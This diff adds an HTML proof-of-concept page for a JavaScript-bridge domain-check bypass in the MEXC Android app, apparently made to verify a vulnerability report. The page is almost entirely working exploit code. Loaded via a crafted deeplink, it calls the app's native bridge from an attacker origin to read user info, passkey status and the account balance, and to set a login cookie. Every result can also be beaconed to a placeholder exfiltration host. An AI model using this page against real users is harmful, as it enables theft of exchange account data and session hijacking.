@@ -1,0 +1,125 @@
+<!--
+PoC page for MEXC Android JS-bridge bypass — verification harness.
+
+The page is launched three ways by ../verify.ps1 (see banner labels below):
+
+  TEST 1   deeplink accepted        mexc://page/web?url=THIS_PAGE (no page_params)
+                                    -> only proves MEXC opens the WebView
+                                    -> bridge expected ABSENT
+
+  TEST 2   bypass-ON probe          ...&page_params={"ignoreJsDomainCheck":true}
+                                    -> bridge expected PRESENT
+                                    -> getUserInfo / fetch expected to return data
+
+  TEST 3   bypass-OFF control       ...&page_params={"ignoreJsDomainCheck":false}
+                                    -> bridge calls expected to FAIL the domain check
+                                    -> proves the flag is the cause (kills false positives)
+
+Hardcoded EXFIL endpoint below is a no-op placeholder; replace with your
+collaborator URL only if you also want a network-side capture. The DOM log
+is the primary evidence.
+-->
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8"/>
+<title>MEXC PoC</title>
+<style>
+  :root { color-scheme: light dark; }
+  body  { font: 14px/1.4 -apple-system, system-ui, monospace; padding: 12px; margin: 0; }
+  .banner { padding: 14px; border-radius: 6px; text-align: center;
+            font-weight: 700; font-size: 18px; margin-bottom: 10px; }
+  .ok    { background: #0a4; color: #fff; }
+  .fail  { background: #b22; color: #fff; }
+  .info  { background: #246; color: #fff; }
+  .meta  { background: #333; color: #fff; padding: 8px; border-radius: 4px;
+           font-size: 12px; margin-bottom: 10px; }
+  pre    { background: #111; color: #cfc; padding: 10px; white-space: pre-wrap;
+           border-radius: 4px; max-height: 60vh; overflow: auto; font-size: 12px; }
+  .tag   { display: inline-block; padding: 2px 8px; border-radius: 3px;
+           background: #fc0; color: #000; font-weight: 700; }
+</style>
+</head>
+<body>
+
+<div id="testBanner" class="banner info">[detecting test variant]</div>
+<div id="bridgeBanner" class="banner info">[probing window.mexcAppJsBridge]</div>
+<div class="meta" id="meta">[origin / params not yet shown]</div>
+<pre id="log">[loading]</pre>
+
+<script>
+const EXFIL = ""; // leave blank to skip beacon; set to https://YOUR_HOST/exfil to capture
+const out = [];
+const $log = document.getElementById("log");
+const $meta = document.getElementById("meta");
+const $tb = document.getElementById("testBanner");
+const $bb = document.getElementById("bridgeBanner");
+
+function record(label, value) {
+  const line = "[" + new Date().toISOString() + "] " + label + " :: " +
+               (typeof value === "string" ? value : JSON.stringify(value));
+  out.push(line); $log.textContent = out.join("\n");
+  if (EXFIL) { try { navigator.sendBeacon(EXFIL, line); } catch (_) {} }
+}
+
+// Read ?test=1|2|3 set by the launcher URL (verify.ps1 appends it).
+const params = new URLSearchParams(location.search);
+const test = params.get("test") || "?";
+const labels = {
+  "1": "TEST 1 — deeplink accepted (no page_params)",
+  "2": "TEST 2 — bypass-ON probe (ignoreJsDomainCheck=true)",
+  "3": "TEST 3 — bypass-OFF control (ignoreJsDomainCheck=false)",
+  "?": "TEST ? — variant not labelled",
+};
+$tb.textContent = labels[test] || labels["?"];
+$tb.className = "banner " + (test === "2" ? "ok" : (test === "3" ? "fail" : "info"));
+
+$meta.textContent =
+  "host=" + location.host + "   path=" + location.pathname +
+  "   ua=" + navigator.userAgent.slice(0, 110);
+
+function call(method, payload) {
+  return new Promise((resolve) => {
+    const cb = "cb_" + Math.random().toString(36).slice(2);
+    window[cb] = (resp) => { resolve(resp); try { delete window[cb]; } catch (_) {} };
+    try {
+      window.mexcAppJsBridge.callNative(method, JSON.stringify(payload || {}), cb);
+    } catch (e) {
+      resolve({ error: String(e) });
+    }
+    setTimeout(() => resolve({ error: "timeout" }), 5000);
+  });
+}
+
+(async () => {
+  const hasBridge = !!window.mexcAppJsBridge;
+  if (!hasBridge) {
+    $bb.textContent = "BRIDGE ABSENT  (window.mexcAppJsBridge undefined)";
+    $bb.className = "banner fail";
+    record("BRIDGE", "ABSENT");
+    return;
+  }
+  $bb.textContent = "BRIDGE PRESENT  (window.mexcAppJsBridge exposed)";
+  $bb.className = "banner ok";
+  record("BRIDGE", "PRESENT");
+
+  // Probe the high-impact native methods. For TEST 3 these should be
+  // blocked by p7.j.l() returning false on attacker origin; for TEST 2
+  // they should return real data.
+  record("getAppInfo",            await call("getAppInfo"));
+  record("getUserInfo",           await call("getUserInfo"));
+  record("checkPasskeyStatus",    await call("checkPasskeyStatus"));
+  record("getStatusBarHeight",    await call("getStatusBarHeight"));
+  record("fetch /api/account/balance", await call("fetch", {
+    url: "/api/account/balance",
+    method: "GET",
+  }));
+  record("setLoginCookieForDomain (probe only)", await call("setLoginCookieForDomain", {
+    domain: location.host,
+    cookie: "PoC=" + Date.now(),
+  }));
+  record("DONE", "probe complete");
+})();
+</script>
+</body>
+</html>
